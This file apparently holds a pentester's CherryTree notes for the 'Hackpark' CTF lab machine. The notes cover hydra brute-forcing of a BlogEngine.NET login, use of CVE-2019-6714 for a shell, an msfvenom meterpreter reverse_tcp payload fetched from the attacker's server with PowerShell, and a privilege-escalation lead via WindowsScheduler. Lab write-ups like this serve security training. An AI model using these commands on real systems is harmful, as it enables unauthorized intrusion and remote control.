@@ -1,0 +1,138 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="Hackpark" unique_id="18" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692823959" ts_lastsave="1692847859">
+    <rich_text>nmap -sC -sV -vv -Pn -n -p- 10.10.226.172
+
+
+
+
+
+
+
+
+</rich_text>
+    <rich_text link="webs http://10.10.226.172/Account/login.aspx?ReturnURL=/admin/">http://10.10.226.172/Account/login.aspx?ReturnURL=/admin/</rich_text>
+    <rich_text>
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.226.172 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=yZkHjJO7qwiLBXczlQrwVkTdYFtZRIBPW%2B%2FkXpGLQAn3h8aNeDKyAKQDxd2ItBMxK9UJNaHKHzUKOqYljTObvbzhmzjcWNzAC%2FpHEnqE3in0iY0Y94SmfAhXy9y1g%2FeEzLvq1XZJ4KIV2ayboR%2B0nzoOQQWuj4GMcSz7QLidieaGe3o6&amp;__EVENTVALIDATION=Vp347x3JauU%2BEtZkakAVmzRE%2BhU8KGD61SJdJ3O0W0%2BGzzETjpZ3BxQWtdk483ISX6UMtOgO6a6F4FkmtFKcV3yZBNYyUko9HhgXOFJT%2B0FI%2F00W9EC1%2Fhv3HuEKRICLj2UwodXX6nmv7swHJJRoHfwRJkDk6BAVs%2BaLFGTTyOW%2F6dr7&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in~:Login failed" -V 
+
+[80][http-post-form] host: 10.10.226.172   login: admin   password: 1qaz2wsx
+
+</rich_text>
+    <rich_text link="webs http://10.10.226.172/admin/about.cshtml">http://10.10.226.172/admin/about.cshtml</rich_text>
+    <rich_text>
+Your BlogEngine.NET Specification
+
+    Version: 3.3.6.0
+    Configuration: Single blog
+    Trust level: Unrestricted
+    Identity: IIS APPPOOL\Blog
+    Blog provider: XmlBlogProvider
+    Membership provider: XmlMembershipProvider
+    Role provider: XmlRoleProvider
+    
+</rich_text>
+    <rich_text link="webs https://www.exploit-db.com/exploits/46353">https://www.exploit-db.com/exploits/46353</rich_text>
+    <rich_text>		-		directory traversal
+CVE-2019-6714
+follow the instructions exactly to gain a shell including the name PostView.ascx rest of them dont work for instance payload.ascx
+
+msfvenom --payload windows/meterpreter/reverse_tcp LHOST=10.18.85.195 LPORT=4445 -f exe &gt; payload.exe
+python3 -m http.server
+powershell -c "Invoke-WebRequest -Uri '</rich_text>
+    <rich_text link="webs http://10.18.85.195:8000/payload.exe'">http://10.18.85.195:8000/payload.exe'</rich_text>
+    <rich_text> -OutFile 'C:\Windows\temp\payload.exe'"
+10.10.226.172 - - [24/Aug/2023 03:37:52] "GET /payload.exe HTTP/1.1" 200 -
+
+Using meterpreter to create a connection
+msfconsole -q
+use exploit/multi/handler		-		lhost 10.18.85.195 lport 4445 payload windows/meterpreter/reverse_tcp
+
+meterpreter &gt; sysinfo
+Computer        : HACKPARK
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+
+
+Winpeas.sh
+powershell -c "Invoke-WebRequest -Uri '</rich_text>
+    <rich_text link="webs http://10.18.85.195:8000/payload.exe'">http://10.18.85.195:8000/winpeas.bat'</rich_text>
+    <rich_text> -OutFile 'C:\Windows\temp\winpeas.bat'"
+
+
+Image Name                     PID Services                                                                                                                                                                                      
+========================= ======== ============================================                                                                                                                                                  
+System Idle Process              0 N/A                                                                                                                                                                                           
+System                           4 N/A                                                                                                                                                                                           
+smss.exe                       372 N/A                                                                                                                                                                                           
+csrss.exe                      528 N/A                                                                                                                                                                                           
+csrss.exe                      580 N/A                                                                                                                                                                                           
+wininit.exe                    588 N/A                                                                                                                                                                                           
+winlogon.exe                   616 N/A                                                                                                                                                                                           
+services.exe                   676 N/A                                                                                                                                                                                           
+lsass.exe                      684 SamSs                                                                                                                                                                                         
+svchost.exe                    744 BrokerInfrastructure, DcomLaunch, LSM,                                                                                                                                                        
+                                   PlugPlay, Power, SystemEventsBroker                                                                                                                                                           
+svchost.exe                    788 RpcEptMapper, RpcSs                                                                                                                                                                           
+dwm.exe                        872 N/A                                                                                                                                                                                           
+svchost.exe                    888 Dhcp, EventLog, lmhosts, Wcmsvc                                                                                                                                                               
+svchost.exe                    916 AeLookupSvc, CertPropSvc, DsmSvc, gpsvc,                                                                                                                                                      
+                                   iphlpsvc, LanmanServer, ProfSvc, Schedule,                                                                                                                                                    
+                                   SENS, SessionEnv, ShellHWDetection, Themes,                                                                                                                                                   
+                                   Winmgmt                                                                                                                                                                                       
+svchost.exe                    976 EventSystem, FontCache, netprofm, nsi,                                                                                                                                                        
+                                   W32Time, WinHttpAutoProxySvc                                                                                                                                                                  
+svchost.exe                    356 CryptSvc, Dnscache, LanmanWorkstation,                                                                                                                                                        
+                                   NlaSvc, WinRM                                                                                                                                                                                 
+svchost.exe                    988 BFE, DPS, MpsSvc                                                                                                                                                                              
+spoolsv.exe                   1156 Spooler                                                                                                                                                                                       
+amazon-ssm-agent.exe          1188 AmazonSSMAgent                                                                                                                                                                                
+svchost.exe                   1264 AppHostSvc                                                                                                                                                                                    
+LiteAgent.exe                 1292 AWSLiteAgent                                                                                                                                                                                  
+svchost.exe                   1360 TrkWks, UALSVC, UmRdpService                                                                                                                                                                  
+svchost.exe                   1380 W3SVC, WAS                                                                                                                                                                                    
+</rich_text>
+    <rich_text background="#a5a51d1d2d2d">WService.exe                  1436 WindowsScheduler</rich_text>
+    <rich_text>                                                                                                                                                                              
+WScheduler.exe                1556 N/A                                                                                                                                                                                           
+Ec2Config.exe                 1652 Ec2Config                                                                                                                                                                                     
+WmiPrvSE.exe                  1756 N/A                                                                                                                                                                                           
+svchost.exe                   1992 TermService                                                                                                                                                                                   
+taskhostex.exe                2560 N/A                                                                                                                                                                                           
+explorer.exe                  2620 N/A                                                                                                                                                                                           
+ServerManager.exe             2080 N/A                                                                                                                                                                                           
+WScheduler.exe                2860 N/A                                                                                                                                                                                           
+w3wp.exe                      2472 N/A                                                                                                                                                                                           
+msdtc.exe                     1144 MSDTC                                                                                                                                                                                         
+WmiPrvSE.exe                  2628 N/A                                                                                                                                                                                           
+cmd.exe                       1060 N/A                                                                                                                                                                                           
+conhost.exe                   2096 N/A                                                                                                                                                                                           
+wordpad.exe                   1004 N/A                                                                                                                                                                                           
+payload.exe                   1748 N/A                                                                                                                                                                                           
+cmd.exe                        868 N/A                                                                                                                                                                                           
+conhost.exe                   2236 N/A                                                                                                                                                                                           
+Message.exe                   2824 N/A                                                                                                                                                                                           
+WmiPrvSE.exe                  2396 N/A                                                                                                                                                                                           
+WmiPrvSE.exe                  1952 N/A                                                                                                                                                                                           
+TrustedInstaller.exe          2068 TrustedInstaller                                                                                                                                                                              
+TiWorker.exe                  2756 N/A                                                                                                                                                                                           
+tasklist.exe                  1680 N/A 
+
+
+WScheduler.exe
+</rich_text>
+    <rich_text link="webs https://www.exploit-db.com/exploits/45072">https://www.exploit-db.com/exploits/45072</rich_text>
+    <rich_text>
+Message.exe → Target binary to be exploited
+
+
+
+
+
+
+</rich_text>
+  </node>
+</cherrytree>
